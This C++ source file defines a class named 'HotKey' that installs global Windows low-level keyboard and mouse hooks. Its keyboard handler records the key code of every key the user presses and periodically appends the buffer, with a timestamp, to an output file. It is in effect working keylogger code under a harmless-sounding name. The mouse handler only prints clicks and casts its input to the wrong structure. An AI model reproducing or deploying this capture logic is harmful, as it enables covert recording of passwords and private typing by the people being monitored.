#include "hotkey.h"

#define MAPVK_VK_TO_CHAR 2

/**
* Metodo que inicializa la monitorizacion de eventos de teclado y raton
*/
DWORD HotKey::init(){
    std::cout << "HotKey::init" << std::endl;
    salir = false;
    string fecha = "\r\n" + Constant::fecha() + "\r\n";
    archivo.writeToFile(DATAOUT, (char *)fecha.c_str(), fecha.length(), true);
    return capture( (void *) NULL);
}

/**
*
*/
DWORD HotKey::capture(void *ptr){
    #ifdef WIN
        SetKeyboardHook();
        SetMouseHook();
        MSG msg;
        std::cout << "Empezando getmessage" << std::endl;
        while(GetMessage(&msg, NULL, 0, 0) > 0){
                TranslateMessage(&msg);
                DispatchMessage(&msg);
        }
        std::cout << "Fin getmessage" << std::endl;
        return 1;
    #else
        std::cout << "Iniciando sleep" << std::endl;
        for (int i=0; i < 5; i++){
            std::cout << "Contando: "  << i << std::endl;
            sleep(1);
        }
              return 1;
    #endif
}

#ifdef WIN
/**
* Metodo para detectar pulsaciones del teclado
*/
LRESULT HotKey::LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam ){
	KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;

	switch( wParam )
	{
        case WM_KEYUP: // When the key has been pressed and released
        {
            buff->add(pKeyBoard->vkCode);
            if (buff->getSize() >= buff->MAX_KEYS){
                archivo.writeToFile(DATAOUT, buff->getData(), buff->getSize(), true);
                buff->clear();
            }
        }
        break;

        default:
            return CallNextHookEx( NULL, nCode, wParam, lParam );
	}
	return 0;
}

/**
* Metodo para detectar pulsaciones de raton
*/
LRESULT HotKey::LowLevelMouseProc( int nCode, WPARAM wParam, LPARAM lParam )
{
//    static POINTS ptsCursor;     // coordinates of mouse cursor

    MOUSEINPUT *pMouse = (MOUSEINPUT *)lParam;

	switch( wParam )
	{
        case WM_RBUTTONDOWN:
        case WM_LBUTTONDOWN:
        case WM_MBUTTONDOWN:
//            ptsCursor = MAKEPOINTS(lParam);
            std::cout << "Button down x: " << pMouse->dx << " y: " << pMouse->dy << std::endl; // Show us when the key has been pushed
            break;
        case WM_RBUTTONUP:
        case WM_LBUTTONUP:
        case WM_MBUTTONUP:
//            ptsCursor = MAKEPOINTS(lParam);
            std::cout << "Button up x: " << pMouse->dx << " y: " << pMouse->dy << std::endl; // Show us when the key has been pushed
            break;

        case WM_LBUTTONDBLCLK:
        case WM_RBUTTONDBLCLK:
        case WM_MBUTTONDBLCLK:
//            ptsCursor = MAKEPOINTS(lParam);
            std::cout << "Button dblclk x: " << pMouse->dx << " y: " << pMouse->dy << std::endl; // Show us when the key has been pushed
            break;

        case WM_MOUSEWHEEL:
            std::cout << "Button mousewheel" << std::endl; // Show us when the key has been pushed
            break;

        default:
            return CallNextHookEx( NULL, nCode, wParam, lParam );
	}
	return 0;
}

#endif
